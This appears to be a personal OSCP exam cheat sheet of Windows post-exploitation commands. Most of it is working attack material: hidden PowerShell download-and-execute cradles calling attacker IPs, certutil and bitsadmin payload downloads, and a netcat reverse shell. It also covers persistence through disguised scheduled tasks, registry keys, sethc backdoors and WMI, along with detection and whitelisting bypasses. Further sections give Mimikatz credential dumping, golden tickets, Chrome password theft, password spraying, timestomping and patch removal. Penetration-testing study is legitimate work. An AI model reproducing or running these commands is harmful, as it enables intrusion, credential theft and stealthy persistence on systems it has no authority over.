## my OSCP_note

### Download and execute IEX
```
    powershell -nop -w hidden -c "iex (New-Object Net.WebClient).DownloadString('http://192.168.1.1:80/file')" 
```
#### SCHTASKS
Any user can create a task

Schedule a binary to run with arguments	on system events
```	
	#On System Startup
	schtasks /create /TN OfficeUpdaterA /tr ""c:\evil32.exe" -k password -n services" /SC onstart /RU system /RL HIGHEST
	schtasks /create /TN OfficeUpdaterD /tr "\"c:\Program Files\evil32.exe\" -k password -n services" /SC onstart /RU system /RL HIGHEST
	
	#On User Login
	schtasks /create /TN OfficeUpdaterB /tr ""c:\evil32.exe" -k password -n services" /SC onlogon
	schtasks /create /TN OfficeUpdaterE /tr "\"c:\Program Files\evil32.exe\" -k password -n services" /SC onlogon	

	#On Idle
	schtasks /create /TN OfficeUpdaterC /tr ""c:\evil32.exe" -k password -n services" /SC onidle /i 30''''
	schtasks /create /TN OfficeUpdaterF /tr "\"c:\Program Files\evil32.exe\" -k password -n services" /SC onidle /i 60
```

Use the Powershell Web Delivery (Download and Execute) module in Metasploit 'exploit\windows\misc\psh_web_delivery'
```
	#(X86) - On User Login
	schtasks /create /tn OfficeUpdaterA /tr "c:\windows\system32\WindowsPowerShell\v1.0\powershell.exe -WindowStyle hidden -NoLogo -NonInteractive -ep bypass -nop -c 'IEX ((new-object net.webclient).downloadstring('''http://<ip address>/<uri>'''))'" /sc onlogon /ru System
 
	#(X86) - On System Start
	schtasks /create /tn OfficeUpdaterB /tr "c:\windows\system32\WindowsPowerShell\v1.0\powershell.exe -WindowStyle hidden -NoLogo -NonInteractive -ep bypass -nop -c 'IEX ((new-object net.webclient).downloadstring('''http://<ip address>/<uri>'''))'" /sc onstart /ru System
 
	#(X86) - On User Idle (30mins)
	schtasks /create /tn OfficeUpdaterC /tr "c:\windows\system32\WindowsPowerShell\v1.0\powershell.exe -WindowStyle hidden -NoLogo -NonInteractive -ep bypass -nop -c 'IEX ((new-object net.webclient).downloadstring('''http://<ip address>/<uri>'''))'" /sc onidle /i 30
 
	#(X64) - On User Login
	schtasks /create /tn OfficeUpdaterA /tr "c:\windows\syswow64\WindowsPowerShell\v1.0\powershell.exe -WindowStyle hidden -NoLogo -NonInteractive -ep bypass -nop -c 'IEX ((new-object net.webclient).downloadstring('''http://<ip address>/<uri>'''))'" /sc onlogon /ru System
 
	#(X64) - On System Start
	schtasks /create /tn OfficeUpdaterB /tr "c:\windows\syswow64\WindowsPowerShell\v1.0\powershell.exe -WindowStyle hidden -NoLogo -NonInteractive -ep bypass -nop -c 'IEX ((new-object net.webclient).downloadstring('''http://<ip address>/<uri>'''))'" /sc onstart /ru System
 
	#(X64) - On User Idle (30mins)
	schtasks /create /tn OfficeUpdaterC /tr "c:\windows\syswow64\WindowsPowerShell\v1.0\powershell.exe -WindowStyle hidden -NoLogo -NonInteractive -ep bypass -nop -c 'IEX ((new-object net.webclient).downloadstring('''http://192.168.95.195:8080/kBBldxiub6'''))'" /sc onidle /i 30
```

### EncodedCommand and IEX detection bypass

Author: Dave Kennedy
Source: https://www.trustedsec.com/blog/circumventing-encodedcommand-detection-powershell/

Avoid detection of -enc
```
	powershell -window hidden -C "set-variable -name "C" -value "-"; set-variable -name "s" -value "e"; set-variable -name "q" -value "c"; set-variable -name "P" -value ((get-variable C).value.toString()+(get-variable s).value.toString()+(get-variable q).value.toString()) ; powershell (get-variable P).value.toString() <b64encodedcommandhere>"
```

Avoid detection of IEX
```
	powershell -window hidden -C "set-variable -name "LB" -value "I"; set-variable -name "I" -value "E"; set-variable -name "V" -value "X"; set-variable -name "wP" -value ((get-variable LB).value.toString()+(get-variable I).value.toString()+(get-variable V).value.toString()) ; powershell (get-variable wP).value.toString() ('<YOURINVOKEEXPRESSIONSTUFFHERE>')"
```

## Application Whitelisting Bypass Techniques

[SubTee Collection of Whitelist Bypass Techniques ](https://github.com/subTee/ApplicationWhitelistBypassTechniques/blob/master/TheList.txt)
https://bitbucket.org/jsthyer/wevade.git

Version .0.0.3
```
1. IEExec -This technique may work in certain environments.  Its relies on the fact that many organizations trust executables signed
by Microsoft.  We can misuse this trust by launching a specially crafted .NET application. 
Example Here: https://room362.com/post/2014/2014-01-16-application-whitelist-bypass-using-ieexec-dot-exe/

2.  Rundll32.exe

3.  ClickOnce Applications dfsvc.exe dfshim.dll

4.  XBAP - XML Browser Applications WPF PresentationHost.exe

5.  MD5 Hash Collision 
http://www.mathstat.dal.ca/~selinger/md5collision/

6.  PowerShell - Specifically Reflective Execution
http://clymb3r.wordpress.com/2013/04/06/reflective-dll-injection-with-powershell/
https://www.defcon.org/images/defcon-21/dc-21-presentations/Bialek/DEFCON-21-Bialek-PowerPwning-Post-Exploiting-by-Overpowering-Powershell.pdf

7. .HTA Application Invoke PowerShell Scripts
    Launched by mshta.exe, bypasses IE security settings as well.

8.  bat, vbs, ps1
    1. cmd.exe /k < script.txt
    2. cscript.exe //E:vbscript script.txt
    3. Get-Content script.txt | iex
    
9. Malicious Troubleshooting packs - MSDT.exe
    Reference: http://cybersyndicates.com/2015/10/a-no-bull-guide-to-malicious-windows-trouble-shooting-packs-and-application-whitelist-bypass/
    Thanks to @nberthaume, @Killswitch_GUI 
    
10. InstallUtil.exe
    A signed MS binary that loads assemblies and executes - One of the best.
    Examples here: https://gist.github.com/subTee

11. Regsvcs/Regasm
    See: https://gist.github.com/subTee/fb09ef511e592e6f7993
    These 2 are Excellent.

12. regsvr32.exe 
    https://gist.github.com/subTee/24c7d8e1ff0f5602092f58cbb3f7d302
    This one is just simply amazing... 
    regsvr32 /s /n /u /i:http://example.com/file.sct scrobj.dll

13. Msbuild.exe
    http://subt0x10.blogspot.com/2016/09/bypassing-application-whitelisting.html
```

## Windows Persistence Methods

### Registry Keys

#### Modify registry keys
```	
	#Add a key/value
	reg add \\<systemname>\<KEY> /v "<value>"" /t <type (Binary,REG_SZ,etc)> /d <data>
	
	#Delete a key/value
	reg delete \\<systemname>\<KEY> /v "<value>"
```

#### Userinit Key
This key specifies what program should be launched right after a user logs into Windows. The default program for this key is C:\windows\system32\userinit.exe. Userinit.exe is a program that restores your profile, fonts, colors, etc for your user name. It is possible to add further programs that will launch from this key by separating the programs with a comma.
```	
	HKEY_LOCAL_MACHINE\Software\Microsoft\Windows NT\CurrentVersion\Winlogon\Userinit
	HKLM\Software\Microsoft\Windows NT\CurrentVersion\Winlogon\Userinit = (REG_SZ) C:\windows\system32\userinit.exe,c:\windows\badprogram.exe
```

#### Run Key
```	
	#System Wide
	HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Run
	HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnce

	#Current Logged-On User Only
	HKEY_CURRENT_USER\SOFTWARE\Microsoft\Windows\CurrentVersion\Run
	HKEY_CURRENT_USER\SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnce
```

#### List Image File Execution Options (Debugger file executed when the target file is run)
```	
	HKLM\Software\MS\WindowsNT\CurrentVersion\Image File Execution Options\notepad.exe\debugger(REG_SZ = cmd.exe)
```

#### AppInit_DLLs 
Load custom DLLs each time a program runs (If it loads USER32.dll).  This is checked by most AV!

This value corresponds to files being loaded through the AppInit_DLLs Registry value. The AppInit_DLLs registry value contains a list of dlls that will be loaded when user32.dll is loaded. As most Windows executables use the user32.dll, that means that any DLL that is listed in the AppInit_DLLs registry key will be loaded also. This makes it very difficult to remove the DLL as it will be loaded within multiple processes, some of which can not be stopped without causing system instability. The user32.dll file is also used by processes that are automatically started by the system when you log on. This means that the files loaded in the AppInit_DLLs value will be loaded very early in the Windows startup routine allowing the DLL to hide itself or protect itself before we have access to the system.
```
	HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Windows\AppInit_DLLs
```

#### No-reboot sethc/utilman option using a "debugger" key  

Navigate to HKLM\Software\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\
Make key called "sethc.exe"
Make a REG_SQ value called "Debugger"
Assign it "c:\windows\system32\cmd.exe" as the value
Hit SHIFT 5 times and get a shell as nt authority\system
```	
	reg add "\\hostname\HKLM\Software\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\sethc.exe" /v Debugger /t REG_SZ /d "c:\windows\system32\cmd.exe"
	reg add "\\hostname\HKLM\Software\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\utilman.exe" /v Debugger /t REG_SZ /d "c:\windows\system32\cmd.exe"
```

Remove the debugger key
```
	reg delete "\\hostname\HKLM\Software\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\sethc.exe" /f
	reg delete "\\hostname\HKLM\Software\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\utilman.exe" /f
```

### File Storage Locations

#### Startup Folders
```	
	#All Users - Windows XP
	C:\Documents and Settings\All Users\Start Menu\Programs\Startup

	#All Users - Windows Vista+
	C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup

	#User Profile - Windows XP
	C:\Documents and Settings\<USERNAME>\Start Menu\Programs\Startup

	#User Profile - Windows Vista+
	C:\Users\<USERNAME>\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup
```

#### SETHC/UTILMAN Replacement

Replace these binaries, may require a reboot to take effect
```
	%WINDIR%\System32\sethc.exe
	%WINDIR%\System32\utilman.exe
```

Hit shift 5 times = sethc.exe run by SYSTEM
Windows key + U = utilman.exe run by SYSTEM


#### Volume Shadow Copy (Restore Points)

Windows service that's constantly running - takes snapshots of system directories

Drop Malware -> Create VSC (ReadOnly) -> Delete Malware -> Use WMIC to run VSC of malware

Registry Key to Disable Volume Shadow Copy
```
	HKLM\System\CurrentControlSet\Control\BackupRestore\FilesNotToSnapshot
```

#### VSSADMIN - native windows utility
	
vssadmin create command only applies to Server OS (Win2k3,2008)  
```
	vssadmin list shadows  
	vssadmin create shadow /for=C:  
	wmic /node:DC1 /user:DOMAIN\domainadminsvc /password:domainadminsvc123 process call create "cmd /c vssadmin create shadow /for=C  
	mklink /D C:\VscAccess \\?\GLOBALROOT\Device\HardDiskVolumeShadowCopy1  
	copy \\?\GLOBALROOT\Device\HardDiskVolumeShadowCopy4\path\to\some\file e:\files  
```

#### Use WMIC process call to run an .exe from a Volume Shadow Copy
```
	wmic process call create \\.\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\windows\system32\evil.exe
```

This process will not show the imagename (executable filename) or commandline parameters in the task list.
The file cannot be individually deleted from the shadow copy once created. The entire shadow copy must be deleted to remove it.  
```
	root@kali:~# wmis -U DOMAIN\domainadminsvc%domainadminsvc123 //ServerName \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\system32\evil.exe  
	NTSTATUS: NT_STATUS_OK - Success
```

In Kali Linux you could use the WMIS package to do the same thing:
```
	wmis -U DOMAIN\domainadminsvc%domainadminsvc123 //ServerName \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\system32\evil.exe  
	NTSTATUS: NT_STATUS_OK - Success
```


### Task Scheduling

#### AT
Executes as system and must be an Admin to run it. Check groups with whoami /groups
```
	at 13:20 /interactive cmd
	
	net user \\target /user:Domain\user pass
	net time \\target
	at \\target 13:20 c:\temp\evil.bat
```


### Bloodhound
```
	iex((new-object system.net.webclient).downloadstring('https://raw.githubusercontent.com/BloodHoundAD/BloodHound/master/PowerShell/BloodHound.ps1'));Invoke-Bloodhound -CSVFolder c:\temp -CSVPrefix <prefix>

	Invoke-BloodHound -DomainController <domain IP> -Domain <FQDN> -CSVFolder C:\users\public\libraries -CSVPrefix <prefix> -CollectionMethod Stealth
```

`cmd.exe /c "bitsadmin /transfer myjob /download /priority high http://$ATTACKER/payload.exe %tmp%\payload.exe&start %tmp%\payload.exe
`

`C:\> PowerShell (New-Object System.Net.WebClient).DownloadFile('http://192.168.178.16:8000/launcher.bat’,’launcher.bat'); Start-Process ‘launcher.bat'`


`certutil.exe -urlcache -f http://10.0.0.5/40564.exe bad.exe`


`c:\Users\Public>certutil -urlcache -split -f http://10.10.14.20/puckieshell443.ps1`



`PS C:\pentest> certutil.exe -f -split -VerifyCTL http://192.168.178.12/msbuild_nps.xml
CertUtil: -verifyCTL command FAILED: 0x8009310b (ASN: 267 CRYPT_E_ASN1_BADTAG)
CertUtil: ASN1 bad tag value met.`

```markdown

# Linux: set up ftp server with anonymous logon access;
twistd -n ftp -p 21 -r /file/to/serve

# Windows shell: read FTP commands from ftp-commands.txt non-interactively;
echo open $ATTACKER>ftp-commands.txt
echo anonymous>>ftp-commands.txt
echo whatever>>ftp-commands.txt
echo binary>>ftp-commands.txt
echo get file.exe>>ftp-commands.txt
echo bye>>ftp-commands.txt 
ftp -s:ftp-commands.txt

# Or just a one-liner
(echo open 10.11.0.245&echo anonymous&echo whatever&echo binary&echo get nc.exe&echo bye) > ftp.txt & ftp -s:ftp.txt & nc.exe 10.11.0.245 443 -e cmd

```

```markdown

 echo Set args = Wscript.Arguments  &gt;&gt; webdl.vbs
 timeout 1
 echo Url = "http://1.1.1.1/windows-privesc-check2.exe"  &gt;&gt; webdl.vbs
 timeout 1
 echo dim xHttp: Set xHttp = createobject("Microsoft.XMLHTTP")  &gt;&gt; webdl.vbs
 timeout 1
 echo dim bStrm: Set bStrm = createobject("Adodb.Stream")  &gt;&gt; webdl.vbs
 timeout 1
 echo xHttp.Open "GET", Url, False  &gt;&gt; webdl.vbs
 timeout 1
 echo xHttp.Send  &gt;&gt; webdl.vbs
 timeout 1
 echo with bStrm      &gt;&gt; webdl.vbs
 timeout 1
 echo   .type = 1 '      &gt;&gt; webdl.vbs
 timeout 1
 echo   .open      &gt;&gt; webdl.vbs
 timeout 1
 echo   .write xHttp.responseBody      &gt;&gt; webdl.vbs
 timeout 1
 echo   .savetofile "C:tempwindows-privesc-check2.exe", 2 '  &gt;&gt; webdl.vbs
 timeout 1
 echo end with &gt;&gt; webdl.vbs
 timeout 1
 echo

```

up my server

# Linux
python -m SimpleHTTPServer 80
python3 -m http.server
ruby -r webrick -e "WEBrick::HTTPServer.new(:Port => 80, :DocumentRoot => Dir.pwd).start"
php -S 0.0.0.0:80


_runas_

`C:\Users\Public> runas /user:HTB\administrator /savecred "powershell IEX (New-Object Net.WebClient).DownloadString('http://10.10.14.20/puckieshell443.ps1')"`


`c:\Users\Public> runas /user:ACCESS\administrator /savecred "powershell -EncodedCommand SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AMQAwAC4AMQAwAC4AMQA0AC4AMgAwAC8AcAB1AGMAawBpAGUAcwBoAGUAbABsADUAMwAuAHAAcwAxACcAKQA="`


# Command and Control

Simple TCP Port Redirection

```markdown	

	socat TCP-LISTEN:80,fork TCP:<remote host>:80
	socat TCP-LISTEN:443,fork TCP:<remote host>:443
 
```


UDP Port Redirection 

```markdown

	socat udp4-recvfrom:53,reuseaddr,fork udp4-sendto:<IPADDRESS>; echo -ne
 
```

Simple HTTP Redirect

Save as a file like the following as redirect.html and map to root "/" on your Team Server. Casual browsing to the root of your domain will then simply redirect.

```markdown

	<html>
	<title>Google</title>
	<meta http-equiv="refresh" content="0;url=https://www.googlrrrr.com" />
	</html>
 
```

Dump Google Chrome passwords

```markdown

	shell copy "C:\users\kobrien\appdata\local\google\chrome\user data\default\Login Data" C:\users\public\libraries\ld.dat
	
	steal_token <user pid>

	mimikatz @dpapi::chrome /in:C:\users\public\libraries\ld.dat /unprotect
 
 
 
```

## Mimikatz

https://github.com/gentilkiwi/mimikatz/wiki
https://adsecurity.org/?p=2362

Dump Cleartext Credentials

```markdown

	sekurlsa::wdigest
	sekurlsa::logonpasswords
	lsadump::secrets
 
```

Dump cached domain credentials

```markdown

	lsadump::cache
 
```

Format mscachev2 as ```$DCC2$10240#username#hash```

```markdown

	cat 'mscachecreds.txt' | awk -F “:” {'print "$DCC2$10240#"$1"#"$2'}
 
```

Crack mscachev2 format with Hashcat (extremely slow)

```markdown

	./hashcat -m 2100 -a 0 mscachev2.dump ./wordlists/* -r rules/dive.rule
 
```

DCSYNC - Remote Hash Dumping from a Domain Controller

```markdown

	mimikatz lsadump::dcsync /user:domain\krbtgt
 
```

- There is also a CS built-in function for this
- Source: http://www.harmj0y.net/blog/redteaming/mimikatz-and-dcsync-and-extrasids-oh-my/

Pass the Hash

```markdown

	mimikatz sekurlsa::pth /user:localadmin /domain:. /ntlm:21306681c738c3ed2d615e29be1574a3 /run:powershell -w hidden
 
```

Golden Ticket Creation (File)
```markdown	

	mimikatz kerberos::golden /user:newadmin /domain:domain.com /sid:S-1-5-21-3683589091-3492174527-1688384936 /groups:501,502,513,512,520,518,519 /krbtgt:<krbtgthash> /ticket:newadmin.tkt
 
```

Golden Ticket Creation (Pass-The-Ticket) - Create the ticket for your current session

```markdown

	mimikatz kerberos::golden /user:newadmin /domain:domain.com /sid:S-1-5-21-3683589091-3492174527-1688384936 /krbtgt:<krbtgthash> /ptt
 
```

To create a Golden ticket to own the parent domain, once a child domain controller is compromised you will need the following pieces:

```markdown

	/user:ChildDomainControllerMachineName$  
	/rc4: KRBTGT Hash
	/sid:Child Domain SID
	/domain:FQDN of Child Domain
	/groups:516 
	/sids:ParentSID-516,S-1-5-9 
	/id:ID of Child Domain Controller 
	/ptt
 
```
### Mimikittenz
https://github.com/putterpanda/mimikittenz

mimikittenz is a post-exploitation powershell tool that utilizes the Windows function ReadProcessMemory() in order to extract plain-text passwords from various target processes.

mimikittenz can also easily extract other kinds of juicy info from target processes using regex patterns including but not limited to:

* TRACK2 (CreditCard) data from merchant/POS processes
* PII data
* Encryption Keys & All the other goodstuff

Execution
```
	Invoke-Mimikittenz
```

Customizations
```	
	Custom regex - The syntax for adding custom regex is as follows:
	[mimikittenz.MemProcInspector]::AddRegex("<NameOfTarget>","<regex_here>")

	Custom target process - Just append your target proccess name into the array:
	[mimikittenz.MemProcInspector]::InspectManyProcs("iexplore","chrome","firefox")
```

### DomainPasswordSpray (Internal Windows Domain Password Brute Forcing)

Source: https://github.com/dafthack/DomainPasswordSpray

DomainPasswordSpray is a tool written in PowerShell to perform a password spray attack against users of a domain. By default it will automatically generate the user list from the domain. BE VERY CAREFUL NOT TO LOCKOUT ACCOUNTS!

#### Quick Start Guide
Open a PowerShell terminal from the Windows command line with 'powershell.exe -exec bypass'.
```
	Type 'Import-Module Invoke-DomainPasswordSpray.ps1'.
```

The only option necessary to perform a password spray is either -Password for a single password or -PasswordList to attempt multiple sprays. When using the -PasswordList option Invoke-DomainPasswordSpray will attempt to gather the account lockout observation window from the domain and limit sprays to one per observation window to avoid locking out accounts.

The following command will automatically generate a list of users from the current user's domain and attempt to authenticate using each username and a password of Winter2016.
```
	PowerShell Invoke-DomainPasswordSpray -Password Winter2016
```

The following command will use the userlist at users.txt and try to authenticate to the domain "domain-name" using each password in the passlist.txt file one at a time. It will automatically attempt to detect the domain's lockout observation window and restrict sprays to one attempt during each window. The results of the spray will be output to a file called sprayed-creds.txt
```
	PowerShell Invoke-DomainPasswordSpray -UserList users.txt -Domain domain-name -PasswordList passlist.txt -OutFile sprayed-creds.txt
```

#### Invoke-DomainPasswordSpray Options
```
	UserList          - Optional UserList parameter. This will be generated automatically if not specified.
	Password          - A single password that will be used to perform the password spray.
	PasswordList      - A list of passwords one per line to use for the password spray (Be very careful not to lockout accounts).
	OutFile           - A file to output the results to.
	Domain            - A domain to spray against.
```

### Misc Powershell Pasties

List Removeable Drives
```
	Get-WmiObject Win32_LogicalDisk | Where-Object {($_.DriveType -eq 2) -and ($_.DeviceID -ne 'A:')} | %{"USB_PROCESS_DETECTED: " + $_.ProviderName  + "`n"}
```

Random Execution Method
```
$visio = [activator]::CreateInstance([type]::GetTypeFromProgID("visio.application", "system1"))
$docs = $visio.Documents.Add("")
$docs.ExecuteLine('CreateObject("Wscript.Shell").Exec("cmd.exe")')
```
## Active Directory Enumeration

### Adfind

www.joeware.net/freetools/tools/adfind/
```
	AdFind.exe -u account@domain.com -up password -h 10.4.128.40:389 -b dc=domain,dc=com -f "objectcategory=computer" > domain_computers.txt

	AdFind.exe -u account@domain.com -up password -h 10.4.128.40:389 -b dc=domain,dc=com -f "objectcategory=computer" distinguishedName dNSHostName description whenchanged operatingSystem operatingSystemVersion > domain_computers_light.txt

	AdFind.exe -u account@domain.com -up pass -h 10.4.128.40:389 -b dc=domain,dc=com -f "objectcategory=user" samaccountname description pwdlastset orclcommonattribute > domain_users_light.txt
```

## Powershell

List help for cmdlet: `Get-Help [cmdlet] -full`

List available properties and methods: `Get-Member`

For-each loop: `ForEach-Object { $_ }`

Search for string (like grep): `Select-String -path [file] -pattern [string]`

Timestomp
```
	$file=(gi c:\file.exe);
	$date='01/03/2009 12:12 pm';
	$file.LastWriteTime=$date;
	$file.LastAccessTime=$date;
	$file.CreationTime=$date
```

Show last system boot time
```
	Get-WmiObject win32_operatingsystem | select csname, @{LABEL='LastBootUpTime'; EXPRESSION={$_.ConverttoDateTime($_.lastbootuptime)}}
```

Wrap binary execution in a powershell loop
```
	powershell foreach ($target in (get-content c:\users\username\appdata\local\temp\hosts_da_loggedin_unique.txt)) { "[*] $Target:"; (c:\programdata\sd.exe ./administrator@$target -hashes aad3b435b51404eeaad3b435b51404ee:a4bab1c7d4bef62d4c22043ddbf1312c) }`
```

Download a file
```
	[System.Net.ServicePointManager]::ServerCertificateValidationCallback = {$true};(new-object system.net.webclient).downloadfile("https://www.mydomain.com/file","C:\Users\username\AppData\Local\Temp\file.txt")
```

Encode string
```
    echo "iex (New-Object Net.WebClient).DownloadString('http://192.168.1.1:80/file')" | iconv --to-code UTF-16LE | base64 -w 0
```

List recently modified files in path (U:)
```
	Get-Childitem u:\ -Recurse | where-object {!($_.psiscontainer)} | where { $_.LastWriteTime -gt $(Get-Date).AddDays(-1)  } | foreach {"$($_.LastWriteTime) :: $($_.Fullname) "  }
```

List Files 
```
	Select-String -Path c:\fso\*.txt, c:\fso\*.log -pattern ed
```

List First 100 Files
```
	Get-ChildItem -Path XXX |Select -First 100 Fullname
```

List a Process's Loaded Modules (DLL)
```
	get-process -id 1234|select -expand modules
```

Remote Command Execution using MMC
```
	https://enigma0x3.net/2017/01/05/lateral-movement-using-the-mmc20-application-com-object/
```

Get LocalAccountTokenFilterPolicy (Determine if you can authenticate to admin resources over the network, i.e. C$,ADMIN$)
```
	Get-ItemProperty HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\ |Select LocalAccountTokenFilterPolicy |fl
```

Test User Credentials
```
	powerpick $password = ConvertTo-SecureString "PlainTextPassword" -AsPlainText -Force;$cred= New-Object System.Management.Automation.PSCredential ("domain\name", $password);
```

#### Additional Notes

Scheduled Tasks binary paths CANNOT contain spaces because everything after the first space in the path is considered to be a command-line argument. To workaround this behavior, enclose the /TR path parameter between backslash (\) AND quotation marks ("):

Delete scheduled task without prompting	
```	
	schtasks /delete /f /TN taskname
```

Detailed scheduled tasks listing
```	
	schtasks /query /V /FO list
```
	
View scheduled tasks log (for troubleshooting)
```	
	notepad c:\windows\schedlgu.txt (Windows XP)

	notepad c:\windows\tasks\schedlgu.txt (Vista+)
	
```

### Windows Service
```
	sc query
	sc create <\\Target(optional)> <servicename> binPath= <service binary path> type= share start= auto DisplayName= <display name>
	sc delete <servicename>
```

### DLL-Hijacking

Order of DLL Loading
```
1. The directory from which the application is loaded
2. The current directory
3. The system directory, usually C:\\Windows\\System32\\ (The GetSystemDirectory function is called to obtain this directory.)
4. The 16-bit system directory - There is no dedicated function to retrieve the path of this directory, but it is searched as well.
5. The Windows directory. The GetWindowsDirector function is called to obtain this directory.
6. The directories that are listed in the PATH environment variable.
```

Many systems use bginfo (seen it a lot in operational sys). Drop Riched32.dll in the dir with bginfo.exe. Codex.

Older list of dlls as well (2010). https://www.exploit-db.com/dll-hijacking-vulnerable-applications/

On Windows 7 there are three executables that could be exploited and associated DLLs listed below
```	
	C:\windows\ehome\Mcx2Prov.exe
	C:\Windows\ehome\CRYPTBASE.dll

	C:\windows\System32\sysprep\sysprep.exe
	C:\Windows\System32\sysprep\CRYPTSP.dll
	C:\windows\System32\sysprep\CRYPTBASE.dll
	C:\Windows\System32\sysprep\RpcRtRemote.dll
	C:\Windows\System32\sysprep\UxTheme.dll

	C:\windows\System32\cliconfg.exe
	C:\Windows\System32\NTWDBLIB.DLL
```

On Windows 8 there are also three executables that could be exploited and associated DLLs listed below
```	
	C:\windows\System32\sysprep\sysprep.exe
	C:\windows\System32\sysprep\CRYPTBASE.dll
	C:\Windows\System32\Sysprep\dwmapi.dll
	C:\Windows\System32\Sysprep\SHCORE.dll

	C:\windows\System32\cliconfg.exe
	C:\Windows\System32\NTWDBLIB.DLL

	C:\windows\System32\pwcreator.exe
	C:\Windows\System32\vds.exe
	C:\Windows\System32\UReFS.DLL
```

Windows 8.1 there are also three executables that could be exploited and associated DLLs listed below
```
	C:\windows\System32\sysprep\sysprep.exe
	C:\Windows\System32\Sysprep\SHCORE.dll
	C:\Windows\System32\Sysprep\OLEACC.DLL

	C:\windows\System32\cliconfg.exe
	C:\Windows\System32\NTWDBLIB.DLL

	C:\windows\System32\pwcreator.exe
	C:\Windows\System32\vds.exe
	C:\Program Files\Common Files\microsoft shared\ink\CRYPTBASE.dll
	C:\Program Files\Common Files\microsoft shared\ink\CRYPTSP.dll
	C:\Program Files\Common Files\microsoft shared\ink\dwmapi.dll
	C:\Program Files\Common Files\microsoft shared\ink\USERENV.dll
	C:\Program Files\Common Files\microsoft shared\ink\OLEACC.dll
```

#### linkinfo.dll Replacement

Windows explorer in older systems loads linkinfo.dll from c:\windows over c:\windows\system32 if it exists
```
	copy evil.dll c:\windows\linkinfo.dll
```

### WMI Event Persistence via Powershell
WMI Event persistence explained, you can find a bloated version in powersploit.
Three parts to this: 
* WMI Event Filter
* Event Consumer
* Filter/Consumer Binding
This technique gets you *SYSTEM* level persistence, requires admin rights to execute.
Autoruns doesn't even check for this yet. (doubt any AVs are either)
Difficult to detect, Difficult to remove if you dont know what youre doing.
#### WMI Event Filter
Create an event that checks every 60 seconds for a change in Win32_PerfFormattedData_PerfOS_System. (this is always changing)

```    
    $EventFilter = ([WMICLASS]"\\.\root\subscription:__EventFilter").CreateInstance() 
    $EventFilter.QueryLanguage  = "WQL" 
    $EventFilter.Query          = "SELECT * FROM __InstanceModificationEvent WITHIN 60 WHERE TargetInstance ISA 'Win32_PerfFormattedData_PerfOS_System' AND TargetInstance.SystemUpTime >= 240 AND TargetInstance.SystemUpTime < 325" 
    $EVentFilter.EventNamespace = "root\cimv2" 
    $EventFilter.Name           = "OBVIOUSHACKER" 
    $Result = $EventFilter.Put() 
    $Filter = $Result.Path
```

http://msdn.microsoft.com/en-us/library/aa394639(v=vs.85).aspx

#### Event Consumer
Configure what to execute once the event occurs.
Current example is just a ping.

```
    $InstanceConsumer = ([wmiclass]"\\.\root\subscription:CommandLineEventConsumer").CreateInstance() 
    $InstanceConsumer.Name = "OBVIOUSHACKER" 
    $InstanceConsumer.CommandLineTemplate = "ping 127.0.0.1 -n 100"          #CMD TO EXECUTE HERE
    $InstanceConsumer.WorkingDirectory = "C:\\windows\\system32"
    $Result = $InstanceConsumer.Put() 
    $Consumer = $Result.Path
```

http://msdn.microsoft.com/en-us/library/aa389231(v=vs.85).aspx
http://msdn.microsoft.com/en-us/library/aa393649(v=vs.85).aspx

#### Filter/Consumer Binding
This is the object that correlates the Filter with the Consumer.
Runs as system as a child of WmiPrvSE.exe under the svchost.exe running Dcom service.

```
    $InstanceBinding = ([wmiclass]"\\.\root\subscription:__FilterToConsumerBinding").CreateInstance() 
    $InstanceBinding.Filter   = $Filter
    $InstanceBinding.Consumer = $Consumer
    $Result = $InstanceBinding.Put() 
```

http://msdn.microsoft.com/en-us/library/aa394647(v=vs.85).aspx

#### REMOVAL
The filter name would change depending on what you call the wmi event on your target (OBVIOUSHACKER shown as the example)

```
    Get-WmiObject __eventFilter -namespace root\subscription -filter "name='OBVIOUSHACKER'"| Remove-WmiObject
    Get-WmiObject CommandLineEventConsumer -Namespace root\subscription -filter "name='OBVIOUSHACKER'" | Remove-WmiObject
    Get-WmiObject __FilterToConsumerBinding -Namespace root\subscription | Where-Object { $_.filter -match 'OBVIOUSHACKER'} | Remove-WmiObject
```
[Some more detailed information on the subject](http://www.exploit-monday.com/2013/04/PersistenceWithPowerShell.html)


http://www.bleepingcomputer.com/tutorials/windows-program-automatic-startup-locations/


### Malicious Outlook Rules

* https://labs.mwrinfosecurity.com/blog/malicous-outlook-rules/
* Ruler
 - https://github.com/sensepost/ruler

### Windows Remote Management (WinRM) / PSRemoting

* Listens on 5985/5986 by default and allows interactive shell access over HTTP/S
* Find by scanning for /wsman and looking for HTTP 402 errors (or use Metasploit module)
* Metasploit has multiple modules for locating the service and gaining shells over WinRM

*Connect to a remote host with WinRM from local Windows host*
```
	Enable-PSRemoting
	Set-Item -Path WSMan:\localhost\Client\TrustedHosts * -force
	or 
	Set-Item -Path WSMan:\localhost\Client\TrustedHosts -value "<host>" -Force
	$cred = Get-Credential
	Invoke-Command -ComputerName <host> -ScriptBlock { gci c:\ } -credential $cred
```

### Uninstall a patch to leave the system vulnerable
```	
	wusa.exe /uninstall /kb:976932
```
